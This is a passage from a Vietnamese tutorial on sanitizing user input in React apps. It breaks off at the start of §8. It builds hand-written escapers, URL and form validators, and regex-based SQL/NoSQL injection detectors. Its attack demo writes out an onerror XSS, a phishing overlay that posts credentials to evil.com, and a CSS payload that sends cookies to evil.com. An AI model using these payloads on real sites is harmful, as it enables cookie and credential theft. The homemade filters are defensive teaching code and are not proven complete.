# React Input Sanitization — Deep Dive!

> **Chủ đề**: Why is it important to sanitize user inputs in a React app?
> **Ngôn ngữ**: Tiếng Việt — giải thích cực kỳ chi tiết!
> **Phương châm**: Tự viết lại bằng tay — KHÔNG dùng thư viện!

---

## Mục Lục

1. [§1. Tại Sao Phải Sanitize Input?](#1)
2. [§2. Các Loại Input Nguy Hiểm Trong React!](#2)
3. [§3. Tự Viết — Input Sanitizer Từ Đầu!](#3)
4. [§4. Context-Aware Sanitization — Escape Theo Ngữ Cảnh!](#4)
5. [§5. Tự Viết — Form Validator & Sanitizer!](#5)
6. [§6. Tự Viết — URL Sanitizer Cho React!](#6)
7. [§7. SQL Injection & NoSQL Injection Trong React!](#7)
8. [§8. Tự Viết — React Safe Component Patterns!](#8)
9. [§9. Sanitization Pipeline — Kiến Trúc Hoàn Chỉnh!](#9)
10. [§10. Tổng Kết & Câu Hỏi Phỏng Vấn!](#10)

---

## §1. Tại Sao Phải Sanitize Input?

### 1.1. Input = Cửa Ngõ Tấn Công!

```
  USER INPUT — NGUỒN GỐC MỌI LỖ HỔNG:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  NGUYÊN TẮC BẢO MẬT SỐ 1:                             │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │                                                  │  │
  │  │  "NEVER TRUST USER INPUT!"                       │  │
  │  │  "KHÔNG BAO GIỜ TIN INPUT TỪ USER!"             │  │
  │  │                                                  │  │
  │  │  Mọi dữ liệu từ user đều có thể bị:            │  │
  │  │  → Thao túng (manipulated)                      │  │
  │  │  → Chèn mã độc (injected)                      │  │
  │  │  → Giả mạo (spoofed)                           │  │
  │  │                                                  │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  │  CÁC NGUỒN INPUT TRONG REACT APP:                      │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  ① Form inputs     (text, textarea, select...)  │  │
  │  │  ② URL parameters  (query string, hash)         │  │
  │  │  ③ API responses   (data từ server)             │  │
  │  │  ④ File uploads    (tên file, nội dung)         │  │
  │  │  ⑤ localStorage    (có thể bị modify)           │  │
  │  │  ⑥ postMessage     (cross-origin messages)      │  │
  │  │  ⑦ Clipboard       (paste event)                │  │
  │  │  ⑧ Drag & Drop     (dragged content)            │  │
  │  │                                                  │  │
  │  │  TẤT CẢ đều PHẢI được sanitize!                 │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 1.2. Không Sanitize → Hậu Quả!

```
  KHÔNG SANITIZE → THẢM HỌA:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  User Input ──→ React App ──→ ???                      │
  │                                                        │
  │  ┌──────────┐    ┌────────────┐    ┌───────────────┐  │
  │  │ Hacker   │───→│ Form/URL   │───→│ Render HTML   │  │
  │  │ Input    │    │ (no check) │    │ (innerHTML)   │  │
  │  └──────────┘    └────────────┘    └───────┬───────┘  │
  │                                            │           │
  │               ┌────────────────────────────┤           │
  │               ↓            ↓               ↓           │
  │         ┌──────────┐ ┌──────────┐  ┌────────────┐    │
  │         │ XSS      │ │ Data     │  │ Session    │    │
  │         │ Attack   │ │ Theft    │  │ Hijacking  │    │
  │         │ Script   │ │ Cookie   │  │ Phishing   │    │
  │         │ chạy!    │ │ stolen!  │  │ Form giả!  │    │
  │         └──────────┘ └──────────┘  └────────────┘    │
  │                                                        │
  │  CÁC TẤN CÔNG TỪ INPUT KHÔNG SANITIZE:                │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  1. XSS — Chèn JavaScript → đánh cắp cookie    │  │
  │  │  2. HTML Injection — Chèn form giả → phishing   │  │
  │  │  3. CSS Injection — Thay đổi giao diện           │  │
  │  │  4. URL Redirect — Chuyển hướng sang site giả   │  │
  │  │  5. SQL/NoSQL Injection — Tấn công database     │  │
  │  │  6. Command Injection — Chạy lệnh trên server   │  │
  │  │  7. Path Traversal — Đọc file hệ thống          │  │
  │  │  8. ReDoS — Regex chậm → crash server           │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §2. Các Loại Input Nguy Hiểm Trong React!

### 2.1. Bảng Tổng Hợp!

```
  INPUT NGUY HIỂM — PHÂN LOẠI:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ┌────────────┬──────────────┬────────────────────┐   │
  │  │ Loại Input │ Ví dụ       │ Tấn công           │   │
  │  ├────────────┼──────────────┼────────────────────┤   │
  │  │ HTML tag   │ <script>     │ XSS                │   │
  │  │ Event      │ onerror=     │ XSS qua attribute  │   │
  │  │ URL        │ javascript:  │ XSS qua href       │   │
  │  │ CSS        │ expression() │ CSS injection      │   │
  │  │ SQL        │ ' OR 1=1 --  │ SQL injection      │   │
  │  │ JSON       │ {"$gt": ""}  │ NoSQL injection    │   │
  │  │ Path       │ ../../etc    │ Path traversal     │   │
  │  │ Regex      │ (a+)+$      │ ReDoS              │   │
  │  │ Unicode    │ \u202E        │ Visual spoofing    │   │
  │  └────────────┴──────────────┴────────────────────┘   │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 2.2. Tự Viết — Demo Các Loại Tấn Công!

```javascript
// ═══════════════════════════════════════════════════════════
// CÁC LOẠI TẤN CÔNG TỪ INPUT — DEMO!
// ═══════════════════════════════════════════════════════════

// ① XSS QUA FORM INPUT:
function xssViaFormInput() {
  // User nhập vào comment box:
  var comment = "<img src=x onerror=alert(document.cookie)>";

  // ❌ KHÔNG sanitize — render trực tiếp:
  // React JSX: <div dangerouslySetInnerHTML={{__html: comment}} />
  // → Browser parse HTML → img tag → onerror → CHẠY JS!

  // ✅ CÓ sanitize:
  var safe = escapeHTML(comment);
  // → '&lt;img src=x onerror=alert(document.cookie)&gt;'
  // → Hiển thị text, KHÔNG chạy!
}

// ② HTML INJECTION — PHISHING:
function htmlInjectionPhishing() {
  // User nhập vào profile "About me":
  var about =
    '<div style="position:fixed;top:0;left:0;' +
    'width:100%;height:100%;background:white;z-index:9999">' +
    "<h1>Session hết hạn!</h1>" +
    '<form action="https://evil.com/steal">' +
    '<input placeholder="Email" name="email">' +
    '<input type="password" placeholder="Password" name="pw">' +
    "<button>Đăng nhập lại</button></form></div>";

  // ❌ Render qua dangerouslySetInnerHTML → PHISHING!
  // → Overlay che toàn bộ trang!
  // → User thấy form đăng nhập giả!
  // → Nhập thông tin → GỬI cho hacker!
}

// ③ CSS INJECTION:
function cssInjection() {
  // User nhập vào custom theme field:
  var color =
    "red; background-image: url(https://evil.com/track?cookie=" +
    document.cookie +
    ")";

  // ❌ <div style={{color: userInput}}>
  // → CSS parse → background-image load → GỬI cookie!

  // ✅ Validate color: chỉ cho hex/rgb/named colors!
}

// ④ URL REDIRECT:
function openRedirect() {
  // URL: /redirect?url=https://evil.com/fake-login
  var redirectUrl = new URLSearchParams(location.search).get("url");

  // ❌ window.location.href = redirectUrl;
  // → User bị redirect sang trang giả!

  // ✅ Validate URL: chỉ cho phép same-origin!
}
```

---

## §3. Tự Viết — Input Sanitizer Từ Đầu!

### 3.1. Core Sanitizer — Đa Năng!

```javascript
// ═══════════════════════════════════════════════════════════
// INPUT SANITIZER — TỰ VIẾT TỪ ĐẦU!
// Sanitize mọi loại input cho React app!
// ═══════════════════════════════════════════════════════════

var InputSanitizer = (function () {
  // ① ESCAPE HTML — chống XSS:
  function escapeHTML(str) {
    if (typeof str !== "string") return "";
    var result = "";
    for (var i = 0; i < str.length; i++) {
      var ch = str.charAt(i);
      switch (ch) {
        case "&":
          result += "&amp;";
          break;
        case "<":
          result += "&lt;";
          break;
        case ">":
          result += "&gt;";
          break;
        case '"':
          result += "&quot;";
          break;
        case "'":
          result += "&#x27;";
          break;
        case "/":
          result += "&#x2F;";
          break;
        case "`":
          result += "&#96;";
          break;
        default:
          result += ch;
      }
    }
    return result;
  }

  // ② STRIP HTML TAGS — xóa hoàn toàn tag:
  function stripTags(str) {
    if (typeof str !== "string") return "";
    var result = "";
    var inTag = false;

    for (var i = 0; i < str.length; i++) {
      var ch = str.charAt(i);
      if (ch === "<") {
        inTag = true;
      } else if (ch === ">") {
        inTag = false;
      } else if (!inTag) {
        result += ch;
      }
    }
    return result;
  }

  // ③ TRIM & NORMALIZE WHITESPACE:
  function normalizeWhitespace(str) {
    if (typeof str !== "string") return "";
    // Thay nhiều space/tab/newline thành 1 space:
    return str.replace(/\s+/g, " ").replace(/^\s+|\s+$/g, "");
  }

  // ④ REMOVE CONTROL CHARACTERS:
  function removeControlChars(str) {
    if (typeof str !== "string") return "";
    var result = "";
    for (var i = 0; i < str.length; i++) {
      var code = str.charCodeAt(i);
      // Giữ tab(9), newline(10), carriage return(13):
      if (code === 9 || code === 10 || code === 13 || code >= 32) {
        result += str.charAt(i);
      }
    }
    return result;
  }

  // ⑤ SANITIZE NUMBER:
  function sanitizeNumber(value, options) {
    options = options || {};
    var min = options.min != null ? options.min : -Infinity;
    var max = options.max != null ? options.max : Infinity;
    var defaultVal = options.defaultValue != null ? options.defaultValue : 0;
    var allowFloat = options.allowFloat !== false;

    var num = allowFloat ? parseFloat(value) : parseInt(value, 10);
    if (isNaN(num)) return defaultVal;
    if (num < min) return min;
    if (num > max) return max;
    return num;
  }

  // ⑥ SANITIZE EMAIL:
  function sanitizeEmail(str) {
    if (typeof str !== "string") return "";
    // Lowercase, trim:
    str = str.toLowerCase().replace(/^\s+|\s+$/g, "");
    // Chỉ cho phép ký tự email hợp lệ:
    var result = "";
    var validChars = "abcdefghijklmnopqrstuvwxyz0123456789.@_+-";
    for (var i = 0; i < str.length; i++) {
      if (validChars.indexOf(str.charAt(i)) !== -1) {
        result += str.charAt(i);
      }
    }
    // Validate format cơ bản:
    var atIndex = result.indexOf("@");
    if (atIndex < 1 || atIndex === result.length - 1) return "";
    if (result.indexOf(".", atIndex) === -1) return "";
    return result;
  }

  // ⑦ LIMIT LENGTH — chống DoS:
  function limitLength(str, maxLen) {
    if (typeof str !== "string") return "";
    maxLen = maxLen || 1000;
    if (str.length > maxLen) {
      return str.substring(0, maxLen);
    }
    return str;
  }

  // ⑧ SANITIZE — HÀM TỔNG HỢP:
  function sanitize(str, options) {
    options = options || {};
    var result = "" + (str || "");

    // Bước 1: Giới hạn độ dài:
    result = limitLength(result, options.maxLength || 10000);

    // Bước 2: Xóa control characters:
    result = removeControlChars(result);

    // Bước 3: Escape hoặc strip HTML:
    if (options.stripHtml) {
      result = stripTags(result);
    } else if (options.escapeHtml !== false) {
      result = escapeHTML(result);
    }

    // Bước 4: Normalize whitespace:
    if (options.normalizeWhitespace) {
      result = normalizeWhitespace(result);
    }

    // Bước 5: Trim:
    if (options.trim !== false) {
      result = result.replace(/^\s+|\s+$/g, "");
    }

    return result;
  }

  return {
    escapeHTML: escapeHTML,
    stripTags: stripTags,
    normalizeWhitespace: normalizeWhitespace,
    removeControlChars: removeControlChars,
    sanitizeNumber: sanitizeNumber,
    sanitizeEmail: sanitizeEmail,
    limitLength: limitLength,
    sanitize: sanitize,
  };
})();

// THỬ NGHIỆM:
console.log(InputSanitizer.sanitize("<script>alert(1)</script>"));
// → '&lt;script&gt;alert(1)&lt;/script&gt;'

console.log(InputSanitizer.sanitize("<b>Bold</b>", { stripHtml: true }));
// → 'Bold'

console.log(InputSanitizer.sanitizeEmail("  ADMIN@Evil.COM  "));
// → 'admin@evil.com'

console.log(InputSanitizer.sanitizeNumber("abc", { defaultValue: 0 }));
// → 0
```

```
  SANITIZER PIPELINE — LUỒNG XỬ LÝ:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  Raw Input                                              │
  │  "  <script>alert(1)</script>  Hello\x00World  "       │
  │       ↓                                                │
  │  ① limitLength(10000)                                   │
  │  → Cắt nếu quá dài (chống DoS!)                       │
  │       ↓                                                │
  │  ② removeControlChars()                                 │
  │  → Xóa \x00 và ký tự điều khiển!                      │
  │  "  <script>alert(1)</script>  HelloWorld  "           │
  │       ↓                                                │
  │  ③ escapeHTML() hoặc stripTags()                        │
  │  → Escape: "&lt;script&gt;..."                        │
  │  → Strip:  "alert(1)  HelloWorld"                      │
  │       ↓                                                │
  │  ④ normalizeWhitespace()                                │
  │  → "alert(1) HelloWorld"                               │
  │       ↓                                                │
  │  ⑤ trim()                                               │
  │  → "alert(1) HelloWorld"                               │
  │       ↓                                                │
  │  ✅ Safe Output!                                        │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §4. Context-Aware Sanitization — Escape Theo Ngữ Cảnh!

### 4.1. Ngữ Cảnh Khác Nhau = Escape Khác Nhau!

```
  CONTEXT-AWARE SANITIZATION — TẠI SAO QUAN TRỌNG?
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  CÙNG 1 INPUT — NHƯNG NGỮ CẢNH KHÁC NHAU:             │
  │                                                        │
  │  Input: O'Reilly & Sons                                │
  │                                                        │
  │  ① HTML Body:                                           │
  │  <p>O&#x27;Reilly &amp; Sons</p>                       │
  │  → Escape: ' → &#x27;  & → &amp;                      │
  │                                                        │
  │  ② HTML Attribute:                                      │
  │  <input value="O&#x27;Reilly &amp; Sons">              │
  │  → Escape: ' " & < >                                  │
  │                                                        │
  │  ③ JavaScript String:                                   │
  │  var x = 'O\'Reilly \x26 Sons';                        │
  │  → Escape: ' → \'  & → \x26                           │
  │                                                        │
  │  ④ URL Parameter:                                       │
  │  ?name=O%27Reilly%20%26%20Sons                         │
  │  → Escape: ' → %27  & → %26  space → %20              │
  │                                                        │
  │  ⑤ CSS Value:                                           │
  │  content: 'O\27 Reilly \26  Sons';                     │
  │  → Escape: ' → \27  & → \26                           │
  │                                                        │
  │  → MỖI NGỮ CẢNH CẦN ESCAPE KHÁC NHAU!                 │
  │  → DÙNG SAI ESCAPE = VẪN BỊ TẤN CÔNG!                 │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 4.2. Tự Viết — Context-Aware Escaper!

```javascript
// ═══════════════════════════════════════════════════════════
// CONTEXT-AWARE ESCAPER — TỰ VIẾT!
// Escape đúng theo ngữ cảnh sử dụng!
// ═══════════════════════════════════════════════════════════

var ContextEscaper = {
  // ① HTML BODY — escape cho nội dung text:
  forHTMLBody: function (str) {
    if (typeof str !== "string") return "";
    var map = {
      "&": "&amp;",
      "<": "&lt;",
      ">": "&gt;",
      '"': "&quot;",
      "'": "&#x27;",
    };
    return str.replace(/[&<>"']/g, function (ch) {
      return map[ch];
    });
  },

  // ② HTML ATTRIBUTE — escape cho attribute values:
  forHTMLAttribute: function (str) {
    if (typeof str !== "string") return "";
    var result = "";
    for (var i = 0; i < str.length; i++) {
      var code = str.charCodeAt(i);
      // Chỉ giữ alphanumeric và an toàn:
      if (
        (code >= 48 && code <= 57) || // 0-9
        (code >= 65 && code <= 90) || // A-Z
        (code >= 97 && code <= 122) || // a-z
        code === 32 ||
        code === 46 || // space, dot
        code === 45 ||
        code === 95
      ) {
        // dash, underscore
        result += str.charAt(i);
      } else {
        // Encode thành HTML numeric entity:
        result += "&#x" + code.toString(16) + ";";
      }
    }
    return result;
  },

  // ③ JAVASCRIPT STRING — escape cho JS context:
  forJavaScript: function (str) {
    if (typeof str !== "string") return "";
    var result = "";
    for (var i = 0; i < str.length; i++) {
      var ch = str.charAt(i);
      var code = str.charCodeAt(i);

      if (ch === "\\") result += "\\\\";
      else if (ch === "'") result += "\\'";
      else if (ch === '"') result += '\\"';
      else if (ch === "\n") result += "\\n";
      else if (ch === "\r") result += "\\r";
      else if (ch === "<") result += "\\x3c";
      else if (ch === ">") result += "\\x3e";
      else if (ch === "/") result += "\\/";
      else if (code < 32) result += "\\x" + ("0" + code.toString(16)).slice(-2);
      else result += ch;
    }
    return result;
  },

  // ④ URL COMPONENT — escape cho URL params:
  forURLComponent: function (str) {
    if (typeof str !== "string") return "";
    // Tự viết encodeURIComponent:
    var result = "";
    var unreserved =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.~";
    for (var i = 0; i < str.length; i++) {
      if (unreserved.indexOf(str.charAt(i)) !== -1) {
        result += str.charAt(i);
      } else {
        // Encode byte bằng %XX:
        var code = str.charCodeAt(i);
        if (code < 128) {
          result += "%" + ("0" + code.toString(16).toUpperCase()).slice(-2);
        } else {
          // UTF-8 multi-byte → dùng built-in fallback:
          result += encodeURIComponent(str.charAt(i));
        }
      }
    }
    return result;
  },

  // ⑤ CSS VALUE — escape cho CSS:
  forCSS: function (str) {
    if (typeof str !== "string") return "";
    var result = "";
    for (var i = 0; i < str.length; i++) {
      var code = str.charCodeAt(i);
      if (
        (code >= 48 && code <= 57) ||
        (code >= 65 && code <= 90) ||
        (code >= 97 && code <= 122)
      ) {
        result += str.charAt(i);
      } else {
        result += "\\" + code.toString(16) + " ";
      }
    }
    return result;
  },
};

// THỬ NGHIỆM:
var input = "O'Reilly & <Sons>";
console.log("HTML Body:", ContextEscaper.forHTMLBody(input));
// → O&#x27;Reilly &amp; &lt;Sons&gt;
console.log("HTML Attr:", ContextEscaper.forHTMLAttribute(input));
// → O&#x27;Reilly&#x20;&#x26;&#x20;&#x3c;Sons&#x3e;
console.log("JS String:", ContextEscaper.forJavaScript(input));
// → O\'Reilly & \x3cSons\x3e
console.log("URL:", ContextEscaper.forURLComponent(input));
// → O%27Reilly%20%26%20%3CSons%3E
```

---

## §5. Tự Viết — Form Validator & Sanitizer!

```javascript
// ═══════════════════════════════════════════════════════════
// FORM VALIDATOR & SANITIZER — CHO REACT APP!
// Validate + Sanitize form input trước khi xử lý!
// ═══════════════════════════════════════════════════════════

function FormSanitizer() {
  // ① RULES REGISTRY:
  var rules = {
    required: function (value) {
      if (!value || ("" + value).replace(/\s/g, "") === "") {
        return "Trường này bắt buộc!";
      }
      return null;
    },
    minLength: function (min) {
      return function (value) {
        if (value && value.length < min) {
          return "Tối thiểu " + min + " ký tự!";
        }
        return null;
      };
    },
    maxLength: function (max) {
      return function (value) {
        if (value && value.length > max) {
          return "Tối đa " + max + " ký tự!";
        }
        return null;
      };
    },
    email: function (value) {
      if (!value) return null;
      var parts = value.split("@");
      if (
        parts.length !== 2 ||
        parts[0].length < 1 ||
        parts[1].indexOf(".") === -1
      ) {
        return "Email không hợp lệ!";
      }
      return null;
    },
    noHTML: function (value) {
      if (!value) return null;
      if (/<[^>]*>/.test(value)) {
        return "Không được chứa HTML tags!";
      }
      return null;
    },
    alphanumeric: function (value) {
      if (!value) return null;
      if (!/^[a-zA-Z0-9\s]+$/.test(value)) {
        return "Chỉ chấp nhận chữ cái và số!";
      }
      return null;
    },
    safeText: function (value) {
      if (!value) return null;
      // Chặn ký tự nguy hiểm phổ biến:
      var dangerous = /[<>"'`\\;(){}]/;
      if (dangerous.test(value)) {
        return "Chứa ký tự không được phép!";
      }
      return null;
    },
  };

  // ② VALIDATE FORM:
  function validateForm(formData, schema) {
    var errors = {};
    var sanitized = {};

    var fields = Object.keys(schema);
    for (var i = 0; i < fields.length; i++) {
      var field = fields[i];
      var fieldRules = schema[field];
      var value = formData[field];
      var fieldErrors = [];

      // Chạy từng rule:
      for (var j = 0; j < fieldRules.length; j++) {
        var rule = fieldRules[j];
        var error;

        if (typeof rule === "string") {
          // Named rule:
          error = rules[rule](value);
        } else if (typeof rule === "function") {
          // Custom rule:
          error = rule(value);
        }

        if (error) {
          fieldErrors.push(error);
        }
      }

      if (fieldErrors.length > 0) {
        errors[field] = fieldErrors;
      }

      // Sanitize giá trị:
      sanitized[field] = sanitizeValue(value, field);
    }

    return {
      isValid: Object.keys(errors).length === 0,
      errors: errors,
      sanitized: sanitized,
    };
  }

  // ③ SANITIZE VALUE:
  function sanitizeValue(value, fieldName) {
    if (value == null) return "";
    var str = "" + value;
    str = str.replace(/^\s+|\s+$/g, ""); // Trim
    str = str.replace(/\s+/g, " "); // Normalize whitespace
    // Xóa null bytes:
    str = str.replace(/\0/g, "");
    return str;
  }

  return { validate: validateForm, rules: rules };
}

// THỬ NGHIỆM:
var form = FormSanitizer();
var result = form.validate(
  {
    name: "  <script>alert(1)</script>  ",
    email: "test@example.com",
    comment: "",
  },
  {
    name: ["required", "noHTML", "safeText"],
    email: ["required", "email"],
    comment: ["required", form.rules.maxLength(500)],
  },
);

console.log("Valid?", result.isValid);
// → false
console.log("Errors:", JSON.stringify(result.errors, null, 2));
// → { name: ['Không được chứa HTML tags!', 'Chứa ký tự không được phép!'],
//     comment: ['Trường này bắt buộc!'] }
```

---

## §6. Tự Viết — URL Sanitizer Cho React!

```javascript
// ═══════════════════════════════════════════════════════════
// URL SANITIZER — CHỐNG XSS QUA URL!
// Validate và sanitize URL trước khi dùng trong React!
// ═══════════════════════════════════════════════════════════

function URLSanitizer() {
  // ① WHITELIST PROTOCOLS:
  var SAFE_PROTOCOLS = {
    "http:": true,
    "https:": true,
    "mailto:": true,
    "tel:": true,
  };

  var DANGEROUS_PROTOCOLS = {
    "javascript:": true,
    "vbscript:": true,
    "data:": true,
    "blob:": true,
  };

  // ② PARSE URL THỦ CÔNG:
  function parseURL(url) {
    if (typeof url !== "string") return null;
    url = url.replace(/^\s+|\s+$/g, "");

    // Xóa ký tự ẩn (tab, newline) — chống bypass:
    url = url.replace(/[\t\n\r]/g, "");

    // Decode nhiều lần để chống double-encoding:
    var decoded = url;
    var prev = "";
    var maxIterations = 5;
    while (decoded !== prev && maxIterations > 0) {
      prev = decoded;
      try {
        decoded = decodeURIComponent(decoded);
      } catch (e) {
        break;
      }
      maxIterations--;
    }

    // Extract protocol:
    var colonIndex = decoded.indexOf(":");
    if (colonIndex === -1) {
      // Relative URL → an toàn:
      return { protocol: null, isRelative: true, url: url };
    }

    var protocol = decoded.substring(0, colonIndex + 1).toLowerCase();
    return {
      protocol: protocol,
      isRelative: false,
      url: url,
    };
  }

  // ③ VALIDATE URL:
  function isURLSafe(url) {
    var parsed = parseURL(url);
    if (!parsed) return false;

    // Relative URL → OK:
    if (parsed.isRelative) return true;

    // Check protocol:
    if (DANGEROUS_PROTOCOLS[parsed.protocol]) return false;
    if (!SAFE_PROTOCOLS[parsed.protocol]) return false;

    return true;
  }

  // ④ SANITIZE URL:
  function sanitizeURL(url, fallback) {
    fallback = fallback || "#";

    if (!isURLSafe(url)) {
      console.warn("Blocked unsafe URL:", url);
      return fallback;
    }
    return url;
  }

  // ⑤ SANITIZE REDIRECT URL (chống Open Redirect):
  function sanitizeRedirectURL(url, allowedDomains) {
    if (!isURLSafe(url)) return "/";

    // Parse domain:
    var parsed = parseURL(url);
    if (parsed.isRelative) return url; // Relative → OK

    // Kiểm tra domain:
    try {
      var a = document.createElement("a");
      a.href = url;
      var hostname = a.hostname;

      for (var i = 0; i < allowedDomains.length; i++) {
        if (
          hostname === allowedDomains[i] ||
          hostname.indexOf("." + allowedDomains[i]) ===
            hostname.length - allowedDomains[i].length - 1
        ) {
          return url; // Domain hợp lệ!
        }
      }
    } catch (e) {}

    console.warn("Blocked redirect to:", url);
    return "/"; // Redirect về trang chủ!
  }

  return {
    isURLSafe: isURLSafe,
    sanitizeURL: sanitizeURL,
    sanitizeRedirectURL: sanitizeRedirectURL,
  };
}

// THỬ NGHIỆM:
var urlSan = URLSanitizer();

console.log(urlSan.isURLSafe("https://safe.com")); // true
console.log(urlSan.isURLSafe("javascript:alert(1)")); // false
console.log(urlSan.isURLSafe("/relative/path")); // true
console.log(urlSan.isURLSafe("data:text/html,<h1>XSS</h1>")); // false

// Double-encoding bypass attempt:
console.log(urlSan.isURLSafe("java%73cript:alert(1)")); // false!

// Redirect:
console.log(urlSan.sanitizeRedirectURL("https://evil.com/fake", ["myapp.com"])); // → '/' (blocked!)
```

```
  URL SANITIZER — SƠ ĐỒ KIỂM TRA:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  Input URL                                              │
  │       ↓                                                │
  │  ① Remove hidden chars (\t \n \r)                      │
  │       ↓                                                │
  │  ② Decode nhiều lần (chống double-encoding)            │
  │       ↓                                                │
  │  ③ Extract protocol                                    │
  │       ↓                                                │
  │  ┌────┴────┐                                           │
  │  │Relative?│                                           │
  │  └────┬────┘                                           │
  │   Yes  │  No                                           │
  │   ↓    ↓                                               │
  │  ✅   Protocol check                                   │
  │  OK!   ┌─────────┴─────────┐                           │
  │        ↓                   ↓                           │
  │   In whitelist?      In blacklist?                     │
  │   http/https/        javascript/                       │
  │   mailto/tel         vbscript/data                     │
  │        ↓                   ↓                           │
  │   ✅ ALLOW!          ❌ BLOCK!                          │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §7. SQL Injection & NoSQL Injection Trong React!

### 7.1. React App Có Bị SQL Injection Không?

```
  SQL INJECTION & REACT — MỐI QUAN HỆ:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ❓ React app có bị SQL injection không?                │
  │                                                        │
  │  → React chạy ở CLIENT-SIDE!                           │
  │  → React KHÔNG trực tiếp truy cập database!           │
  │  → NHƯNG React GỬI input lên server qua API!          │
  │                                                        │
  │  ┌──────────┐  API  ┌──────────┐ SQL ┌──────────┐    │
  │  │ React    │──────→│ Server   │────→│ Database │    │
  │  │ (Client) │       │ (API)    │     │          │    │
  │  │          │       │          │     │          │    │
  │  │ Input:   │       │ Query:   │     │ Thực thi │    │
  │  │ ' OR 1=1 │       │ SELECT * │     │ truy vấn │    │
  │  │ --       │       │ WHERE    │     │          │    │
  │  │          │       │ name='   │     │          │    │
  │  │          │       │ ' OR 1=1 │     │ LEAK!    │    │
  │  │          │       │ --'      │     │          │    │
  │  └──────────┘       └──────────┘     └──────────┘    │
  │                                                        │
  │  → INPUT TỪ REACT CHẠY ĐẾN DATABASE!                  │
  │  → NẾU SERVER KHÔNG SANITIZE → SQL INJECTION!         │
  │                                                        │
  │  DEFENSE IN DEPTH:                                     │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │  ① Client (React): Sanitize + Validate input    │  │
  │  │  ② Server (API): Parameterized queries          │  │
  │  │  ③ Database: Least privilege permissions        │  │
  │  │                                                  │  │
  │  │  → BẢO VỆ NHIỀU LỚP!                           │  │
  │  │  → React sanitize = LỚP ĐẦU TIÊN!             │  │
  │  └──────────────────────────────────────────────────┘  │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 7.2. Tự Viết — Input Validator Chống Injection!

```javascript
// ═══════════════════════════════════════════════════════════
// INJECTION PREVENTER — CHỐNG SQL/NoSQL INJECTION!
// Client-side defense — lớp bảo vệ đầu tiên!
// ═══════════════════════════════════════════════════════════

function InjectionPreventer() {
  // ① SQL INJECTION PATTERNS:
  var SQL_PATTERNS = [
    /'\s*(OR|AND)\s+\d+\s*=\s*\d+/i, // ' OR 1=1
    /;\s*(DROP|DELETE|UPDATE|INSERT)/i, // ; DROP TABLE
    /UNION\s+SELECT/i, // UNION SELECT
    /--\s*$/, // SQL comment --
    /\/\*.*\*\//, // SQL comment /* */
    /'\s*;\s*$/, // '; (statement end)
    /EXEC\s*\(/i, // EXEC()
    /xp_/i, // Extended procedures
  ];

  // ② NoSQL INJECTION PATTERNS:
  var NOSQL_PATTERNS = [
    /\$(?:gt|gte|lt|lte|ne|eq|in|nin|regex|where|exists)/i,
    /\{\s*"\$[a-z]+"/i, // {"$operator"
    /\bfunction\s*\(/, // function() injection
    /\bthis\b/, // this reference
    /\bsleep\s*\(/i, // sleep() DoS
    /\bdb\./, // db.collection
  ];

  // ③ KIỂM TRA SQL INJECTION:
  function hasSQLInjection(input) {
    if (typeof input !== "string") return false;
    for (var i = 0; i < SQL_PATTERNS.length; i++) {
      if (SQL_PATTERNS[i].test(input)) {
        return {
          detected: true,
          pattern: SQL_PATTERNS[i].source,
          input: input,
        };
      }
    }
    return { detected: false };
  }

  // ④ KIỂM TRA NoSQL INJECTION:
  function hasNoSQLInjection(input) {
    if (typeof input !== "string") return false;
    for (var i = 0; i < NOSQL_PATTERNS.length; i++) {
      if (NOSQL_PATTERNS[i].test(input)) {
        return {
          detected: true,
          pattern: NOSQL_PATTERNS[i].source,
          input: input,
        };
      }
    }
    return { detected: false };
  }

  // ⑤ SANITIZE CHO API REQUEST:
  function sanitizeForAPI(data) {
    if (typeof data === "string") {
      var sqlCheck = hasSQLInjection(data);
      var nosqlCheck = hasNoSQLInjection(data);
      if (sqlCheck.detected || nosqlCheck.detected) {
        console.warn("Injection attempt blocked!", data);
        return ""; // Block!
      }
      return data;
    }
    if (typeof data === "object" && data !== null) {
      var clean = Array.isArray(data) ? [] : {};
      var keys = Object.keys(data);
      for (var i = 0; i < keys.length; i++) {
        var key = keys[i];
        // Chặn keys bắt đầu bằng $ (NoSQL operators):
        if (key.charAt(0) === "$") {
          console.warn("Blocked NoSQL operator key:", key);
          continue;
        }
        clean[key] = sanitizeForAPI(data[key]);
      }
      return clean;
    }
    return data;
  }

  return {
    hasSQLInjection: hasSQLInjection,
    hasNoSQLInjection: hasNoSQLInjection,
    sanitizeForAPI: sanitizeForAPI,
  };
}

// THỬ NGHIỆM:
var preventer = InjectionPreventer();

// SQL Injection:
console.log(preventer.hasSQLInjection("admin' OR 1=1 --"));
// → { detected: true, pattern: "...", input: "admin' OR 1=1 --" }

// NoSQL Injection:
console.log(preventer.hasNoSQLInjection('{"$gt": ""}'));
// → { detected: true, pattern: "...", input: ... }

// Sanitize API data:
console.log(
  preventer.sanitizeForAPI({
    name: "John",
    search: "' OR 1=1 --",
    $gt: "hack",
  }),
);
// → { name: "John", search: "" }
// → $gt key bị XÓA!
```

---

## §8. Tự Viết — React Safe Component Patterns!

### 8.1. Pattern: Safe Input Component!

```javascript
// ═══════════════════════════════════════════════════════════
// SAFE REACT COMPONENT PATTERNS — TỰ VIẾT!
// Component React an toàn — sanitize built-in!
// ═══════════════════════════════════════════════════════════

// ① SAFE TEXT INPUT — sanitize onChange:
